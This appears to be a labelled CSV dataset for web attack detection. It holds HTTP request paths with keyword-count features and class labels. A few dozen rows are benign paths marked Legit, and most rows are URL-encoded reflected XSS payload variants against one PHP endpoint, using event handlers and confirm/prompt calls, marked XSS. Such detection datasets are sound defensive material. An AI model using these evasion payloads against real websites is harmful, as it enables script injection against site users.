method,path,body,single_q,double_q,dashes,braces,spaces,SQL Badwords,XSS Badwords,Command Injection Badords,class
GET,/marcs0h,,0,0,0,0,0,0,0,0,Legit
GET,/wiki/bash_(unix_shell),,0,0,0,1,0,0,0,0,Legit
GET,/dom/defined.php?value=brute,,0,0,0,0,0,0,0,0,Legit
GET,/rrjdpr5jhx,,0,0,0,0,0,0,0,0,Legit
GET,/lab/ent.php?q=%22%3e%27;alert(1)/%27%3c=svg%3e,,2,1,0,1,0,0,1,0,Legit
GET,/search?q=%23hack2learn,,0,0,0,0,0,0,0,0,Legit
GET,/wiki/list_of_file_signatures,,0,0,0,0,0,0,0,0,Legit
GET,/brutexss,,0,0,0,0,0,0,0,0,Legit
GET,/js/js_ajax_intro.asp,,0,0,0,0,0,0,0,0,Legit
GET,/csp/csp-data-whitelist.php?p=guest,,0,0,0,0,0,0,0,0,Legit
GET,/embed/26v01iijegk?version=3&rel=1&showsearch=0&showinfo=1&iv_load_policy=1&fs=1&hl=en-us&autohide=2&wmode=transparent,,0,0,0,0,0,0,0,0,Legit
GET,/js/gprofiles.js?ver=202206,,0,0,0,0,0,0,0,0,Legit
GET,/robots.txt,,0,0,0,0,0,0,0,0,Legit
GET,/blog/ebook/xss-cheat-sheet/,,0,0,0,0,0,0,0,0,Legit
GET,/tests/short.php?q=%3cbase,,0,0,0,0,0,0,0,0,Legit
GET,/wiki/four_horsemen_of_the_apocalypse,,0,0,0,0,0,0,0,0,Legit
GET,/brutal/xssaminer.txt,,0,0,0,0,0,0,0,0,Legit
GET,/2016/07/united-to-xss-united.html,,0,0,0,0,0,0,0,0,Legit
GET,/tests/status.html,,0,0,0,0,0,0,0,0,Legit
GET,/radeksu,,0,0,0,0,0,0,0,0,Legit
GET,/d0lph1n98/defeating-php-gd-imagecreatefromgif,,0,0,0,0,0,1,0,0,Legit
GET,/robots.txt,,0,0,0,0,0,0,0,0,Legit
GET,/brutelogic/status/775709659516862464?ref_src=twsrc%5etfw,,0,0,0,0,0,0,0,0,Legit
GET,/2011/06/xss-in-confined-spaces.html,,0,0,0,0,0,0,0,0,Legit
GET,/asdizzle_,,0,0,0,0,0,0,0,0,Legit
GET,/robots.txt,,0,0,0,0,0,0,0,0,Legit
GET,/robots.txt,,0,0,0,0,0,0,0,0,Legit
GET,/hashtag/xss?src=hash&ref_src=twsrc%5etfw,,0,0,0,0,0,0,0,0,Legit
GET,/fyq7l3w9/,,0,0,0,0,0,0,0,0,Legit
GET,/~phil/exiftool/,,0,0,0,0,0,0,0,0,Legit
GET,/blog/wp-content/plugins/jetpack/modules/theme-tools/responsive-videos/responsive-videos.min.js?ver=1.3,,0,0,0,0,0,0,0,0,Legit
GET,/embed/5dcjlpae5qi?version=3&rel=1&showsearch=0&showinfo=1&iv_load_policy=1&fs=1&hl=en-us&autohide=2&wmode=transparent,,0,0,0,0,0,0,0,0,Legit
GET,/web/en-us/content/contact/bugbounty.aspx,,0,0,0,0,0,0,0,0,Legit
GET,/poc.svg,,0,0,0,0,0,0,0,0,Legit
GET,/lab/welcome.php,,0,0,0,0,0,0,0,0,Legit
GET,/en-us/docs/glossary/hoisting,,0,0,0,0,0,0,0,0,Legit
GET,/pk6gcejqpa,,0,0,0,0,0,0,0,0,Legit
GET,/tests/sinks.html?index=alert(1),,0,0,0,1,0,0,1,0,Legit
GET,/httpsonly,,0,0,0,0,0,0,0,0,Legit
GET,/hashtag/hack2learn,,0,0,0,0,0,0,0,0,Legit
GET,/wiki/0.0.0.0,,0,0,0,0,0,0,0,0,Legit
GET,/robots.txt,,0,0,0,0,0,0,0,0,Legit
GET,/2016/07/17/xss-to-rce-using-wordpress-as-an-example/,,0,0,0,0,0,0,0,0,Legit
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonpointerenter%250d%3d%250dconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonpointerenter%2b%3d%2b%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonpointerenter%2509%3d%2509confirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonmouseover%250a%3d%250a%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonmouseover%2b%3d%2ba%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonmouseover%2b%3d%2b%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonmouseover%2509%3d%2509%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonmouseover%250a%3d%250a%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonpointerenter%250d%3d%250d%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2f%2b%2fonpointerenter%2b%3d%2b%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%2b%3d%2b%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250a%3d%250aa%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%250d%3d%250d%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%250d%3d%250da%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250a%3d%250a%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2b%3d%2b%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2509%3d%2509confirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250d%3d%250da%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2509%3d%2509a%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2509%3d%2509confirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250d%3d%250dconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%2509%3d%2509a%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2b%3d%2b%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%2509%3d%2509%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250d%3d%250d%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%250d%3d%250dconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2b%3d%2b%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250a%3d%250a%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250d%3d%250d%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%2b%3d%2b%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250a%3d%250aconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%2b%3d%2bconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%2509%3d%2509a%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%2b%3d%2b%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonpointerenter%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%2509%3d%2509confirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonpointerenter%2509%3d%2509%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonpointerenter%250d%3d%250d%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonpointerenter%250d%3d%250d%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%250d%3d%250d%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonpointerenter%2b%3d%2bconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%250a%3d%250a%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%250d%3d%250da%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%250a%3d%250a%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonpointerenter%250d%3d%250d%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonpointerenter%2509%3d%2509confirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonpointerenter%2b%3d%2ba%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%2b%3d%2b%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250aonmouseover%250d%3d%250dconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%250a%3d%250a%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%2509%3d%2509confirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%250d%3d%250dconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%2b%3d%2b%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donmouseover%250a%3d%250a%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donmouseover%250d%3d%250d%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%2b%3d%2bconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%250a%3d%250a%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%250a%3d%250a%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%250d%3d%250d%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donmouseover%2b%3d%2bconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%250d%3d%250d%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%250d%3d%250dconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donmouseover%250d%3d%250d%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%2509%3d%2509%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%2b%3d%2b%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donmouseover%2509%3d%2509confirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%2509%3d%2509%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%2b%3d%2bconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donmouseover%2b%3d%2ba%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%250donpointerenter%250d%3d%250da%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%250d%3d%250d%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%2509%3d%2509%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%2b%3d%2bconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%250d%3d%250d%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%2b%3d%2bconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%2b%3d%2b%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%2b%3d%2b%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%2b%3d%2ba%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%2b%3d%2b%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250a%3d%250a%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250a%3d%250a%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%250d%3d%250dconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250d%3d%250d%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250d%3d%250da%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250d%3d%250d%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%250d%3d%250da%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%250a%3d%250aconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%2509%3d%2509%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%2b%3d%2b%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%2509%3d%2509%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250d%3d%250da%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%2509%3d%2509%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250d%3d%250d%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250a%3d%250aconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonmouseover%250a%3d%250a%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%250d%3d%250d%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2f%2b%2fonpointerenter%2b%3d%2bconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%2b%3d%2b%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2b%3d%2bconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%250a%3d%250a%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%250d%3d%250d%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250a%3d%250a%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2b%3d%2ba%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2509%3d%2509%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250d%3d%250dconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%2b%3d%2bconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2b%3d%2b%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250d%3d%250dconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%250d%3d%250dconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%2509%3d%2509a%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2509%3d%2509confirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250a%3d%250a%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2b%3d%2b%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%250a%3d%250aconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2b%3d%2bconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250d%3d%250da%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%2509%3d%2509%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onpointerenter%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%250d%3d%250d%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%2509%3d%2509%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%250a%3d%250aconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3cd3v%2509onmouseover%2b%3d%2ba%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
